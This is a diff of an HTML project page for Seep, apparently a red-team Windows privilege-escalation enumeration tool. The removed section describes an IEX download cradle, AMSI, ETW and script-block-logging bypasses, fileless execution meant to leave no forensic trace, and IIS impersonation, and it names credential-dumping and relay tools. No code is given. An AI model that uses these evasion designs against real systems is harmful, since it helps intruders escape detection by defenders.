-        <div class="count">9 tools</div>
-        <p>Chisel, Ligolo-ng, socat, netcat</p>
-      </div>
-      <div class="cat-card">
-        <h4>Impacket</h4>
-        <div class="count">18 tools</div>
-        <p>secretsdump, GetUserSPNs, psexec, wmiexec, ntlmrelayx</p>
-      </div>
-      <div class="cat-card">
-        <h4>Shells</h4>
-        <div class="count">5 tools</div>
-        <p>Nishang, PHP shells, netcat variants</p>
-      </div>
-    </div>
-  </section>
-
-  <!-- ===== ARCHITECTURE ===== -->
-  <section>
-    <span class="label">Architecture</span>
-    <div class="stitle">How It Works</div>
-    <div class="sdesc">Python CLI on the attack box orchestrates everything. Composed PowerShell agent runs on the target.</div>
-
-    <div class="arch-box"><span class="hl">seep serve</span>                                    <span class="dim">Target (Windows)</span>
-    |                                              |
-    |  <span class="hl2">GET /agent.ps1?token=T</span> ------------------>  IEX download
-    |                                              |
-    |                                     AMSI / ETW / SBL bypass
-    |                                     Invoke-Seep runs (auto)
-    |                                     16 checks --> JSON
-    |                                              |
-    |  <span class="hl2">POST /api/results</span>  <------------------  AES-256-CBC + GZip
-    |   <span class="dim">(auth via token)</span>                           |
-    v                                              |
-<span class="hl">results/results_*.json</span>                             |
-    |                                              |
-<span class="hl">seep report</span> --> RecommendationEngine               |
-    |               |                              |
-    |          MITRE mapping                       |
-    |          Tool suggestions                    |
-    v                                              |
-<span class="hl2">report.html</span> <span class="dim">(self-contained, dark theme)</span>           |</div>
-  </section>
-
-  <!-- ===== OPSEC ===== -->
-  <section>
-    <span class="label">OPSEC</span>
-    <div class="stitle">Operational Security</div>
-    <div class="sdesc">Defense evasion built into every layer &mdash; from cradle to upload.</div>
-
-    <div class="features" style="grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));">
-      <div class="feat">
-        <h3>AMSI Bypass</h3>
-        <p>Reflection-based AMSI patch in cradle and agent, obfuscated format strings.</p>
-      </div>
-      <div class="feat">
-        <h3>ETW + SBL Bypass</h3>
-        <p>Disables PSEtwLogProvider and patches cachedGroupPolicySettings.</p>
-      </div>
-      <div class="feat">
-        <h3>Fileless by Default</h3>
-        <p>IEX cradle, in-memory execution, no disk writes. Zero forensic footprint.</p>
-      </div>
-      <div class="feat">
-        <h3>IIS Impersonation</h3>
-        <p>Server header returns Microsoft-IIS/10.0. Benign "It works!" index page.</p>
-      </div>
-      <div class="feat">
-        <h3>AES-256-CBC Transport</h3>
-        <p>Results encrypted with SHA256(auth_token) key, IV prepended, then GZip compressed.</p>
-      </div>
-      <div class="feat">
-        <h3>Identifier Randomization</h3>
-        <p>CSPRNG-based randomization of function names, variables, headers, and check prefixes.</p>
-      </div>
-    </div>
-  </section>
-
-  <!-- ===== REPORTS ===== -->
-  <section>
-    <span class="label">Output</span>
-    <div class="stitle">Multi-Format Reports</div>
-    <div class="sdesc">HTML, Markdown, and JSON from a single result set.</div>
-
-    <div class="features" style="grid-template-columns: repeat(3, 1fr);">
-      <div class="feat">
-        <h3>HTML</h3>
-        <p>Self-contained dark-themed report. Executive summary, severity donut, per-finding evidence cards, MITRE recommendations.</p>
-      </div>
-      <div class="feat">
-        <h3>Markdown</h3>
-        <p>Structured tables for wikis, Obsidian, or paste into engagement reports. Full evidence blocks.</p>
-      </div>
-      <div class="feat">
-        <h3>JSON</h3>
-        <p>Machine-readable summary. Pipe to <code>jq</code> for scripted workflows. MITRE URLs and tool links included.</p>
-      </div>
-    </div>
-  </section>
-
-</div>
-
-<!-- ===== FOOTER ===== -->
-<footer>
-  <div class="wrap">
-    <div class="tagline">Enumerate. Analyze. Recommend. Escalate.</div>
-    <div class="links">
-      <a href="https://github.com/Real-Fruit-Snacks/Seep">GitHub</a>
-      <a href="https://github.com/Real-Fruit-Snacks/Seep/blob/main/LICENSE">MIT License</a>
-      <a href="https://github.com/Real-Fruit-Snacks/Seep/issues">Issues</a>
-    </div>
-    <div>&copy; 2025 Real-Fruit-Snacks</div>
-  </div>
-</footer>
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-links">
+                <a href="https://github.com/Real-Fruit-Snacks/Seep">GitHub</a>
+                <a href="https://github.com/Real-Fruit-Snacks/Seep/issues">Issues</a>
+                <a href="https://github.com/Real-Fruit-Snacks/Seep/blob/main/LICENSE">MIT License</a>
+                <a href="https://github.com/Real-Fruit-Snacks/Seep/blob/main/CONTRIBUTING.md">Contributing</a>
+                <a href="https://github.com/Real-Fruit-Snacks/Seep/blob/main/SECURITY.md">Security</a>
+            </div>
+            <p class="footer-toolkit">
+                <a href="https://github.com/Real-Fruit-Snacks/Aquifer">Aquifer</a> &middot;
+                <a href="https://github.com/Real-Fruit-Snacks/Cascade">Cascade</a> &middot;
+                <a href="https://github.com/Real-Fruit-Snacks/Conduit">Conduit</a> &middot;
+                <a href="https://github.com/Real-Fruit-Snacks/Flux">Flux</a> &middot;
+                <a href="https://github.com/Real-Fruit-Snacks/HydroShot">HydroShot</a> &middot;
+                <a href="https://github.com/Real-Fruit-Snacks/Riptide">Riptide</a> &middot;
+                <a href="https://github.com/Real-Fruit-Snacks/Runoff">Runoff</a> &middot;
+                <strong>Seep</strong> &middot;
+                <a href="https://github.com/Real-Fruit-Snacks/Slipstream">Slipstream</a> &middot;
+                <a href="https://github.com/Real-Fruit-Snacks/Tidepool">Tidepool</a> &middot;
+                <a href="https://github.com/Real-Fruit-Snacks/Undertow">Undertow</a> &middot;
+                <a href="https://github.com/Real-Fruit-Snacks/Whirlpool">Whirlpool</a>
+            </p>
+            <p class="footer-brand">Part of the <a href="https://github.com/Real-Fruit-Snacks">Real-Fruit-Snacks</a> water-themed security toolkit</p>
+        </div>
+    </footer>
 
 </body>
 </html>
